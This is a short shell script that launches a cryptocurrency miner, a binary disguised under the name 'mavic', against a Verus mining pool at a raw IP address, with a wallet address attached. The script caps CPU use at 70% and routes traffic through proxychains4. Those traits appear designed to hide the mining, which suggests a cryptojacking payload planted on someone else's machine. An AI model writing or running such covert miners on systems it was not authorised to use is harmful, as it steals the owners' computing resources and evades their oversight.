#!/bin/sh

cd /root/ai
cpulimit -f -l 70 -- proxychains4 ./mavic -a verus -o stratum+tcp://149.56.27.47:3956 -u RTQ4T8D6xgLR5u9e1aZZjrBdQy8sog2Zb7.Rigimo -p x -t 2
